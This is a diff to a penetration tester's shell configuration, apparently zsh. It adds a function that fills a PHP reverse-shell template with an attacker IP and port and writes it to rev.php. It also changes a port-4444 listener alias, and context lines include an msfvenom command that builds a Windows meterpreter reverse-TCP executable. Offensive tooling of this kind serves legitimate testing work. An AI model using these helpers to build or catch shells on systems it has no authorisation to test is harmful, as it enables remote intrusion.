@@ -68,6 +68,7 @@ alias pwc='bunx playwright codegen'
 
 # tty upgrades
 alias uptty="echo '/usr/bin/script -qc /bin/bash /dev/null'| wl-copy"
+alias fixtty="stty raw -echo; fg; reset | wl-copy"
 
 # nmap
 nmap-default() {
@@ -106,6 +107,17 @@ venom-exe() {
       echo "[i] Usage: msfvenom ip (options)"
     else
       msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST="${@}" LPORT=4444 -f exe -o reverse.exe
+  fi
+}
+
+# revshells
+phprev () {
+  if [ "$#" -ne 2 ]; 
+    then
+      echo "[i] Usage: phprev ip port"
+    else
+      SHELL=`cat ~/.zsh/revshells/phprev.txt | sed s/x.x.x.x/$1/g | sed s/yyyy/$2/g`
+      echo $SHELL > rev.php
   fi
 }
 
@@ -184,8 +196,8 @@ alias t="tmux"
 alias df="duf"
 alias rr="ranger"
 alias gdb="gdb --quiet"
+alias rsc="catch -p 4444"
 alias cds="du -h --max-depth=1 ."
-alias rsc="rlwrap nc -lnvp 4444"
 alias notes="glow --local ~/Sync/Notes"
 alias www="sudo python3 -m http.server 80"
 alias tcp-server="cd /tmp/ && while :; do nc -l -p 4444 | tee  output.log; sleep 1; done"
@@ -211,7 +223,6 @@ yescrypt-crack() {
         echo "At least one of the files does not exist."
     fi
 }
-
 
 op() {
   if [ $# -eq 0 ]
